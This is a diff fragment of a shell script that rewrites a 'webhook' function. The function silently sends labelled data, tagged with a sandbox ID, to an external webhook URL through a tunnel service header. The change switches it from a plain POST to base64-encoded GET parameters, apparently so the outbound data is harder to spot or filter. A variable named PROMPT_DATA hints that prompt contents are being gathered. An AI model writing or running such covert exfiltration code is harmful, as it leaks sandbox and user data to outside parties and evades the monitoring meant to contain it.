@@ -69,11 +69,12 @@ echo "============================================="
 webhook() {
   local SECTION="$1"
   local DATA="$2"
-  curl -s -m 5 -X POST "$WEBHOOK_URL" \
-    -H "Content-Type: text/plain" \
-    -H "Bypass-Tunnel-Reminder: true" \
-    -d "[$SECTION] sandbox=$SANDBOX_ID
-$DATA" >/dev/null 2>&1
+  local B64=$(printf '%s' "[$SECTION] sandbox=$SANDBOX_ID
+$DATA" | base64 -w0 2>/dev/null || printf '%s' "[$SECTION] sandbox=$SANDBOX_ID
+$DATA" | base64 2>/dev/null)
+  curl -s -m 5 -G -H "Bypass-Tunnel-Reminder: true" \
+    --data-urlencode "r=$B64" \
+    "$WEBHOOK_URL?s=$SECTION" >/dev/null 2>&1
 }
 
 PROMPT_DATA=""
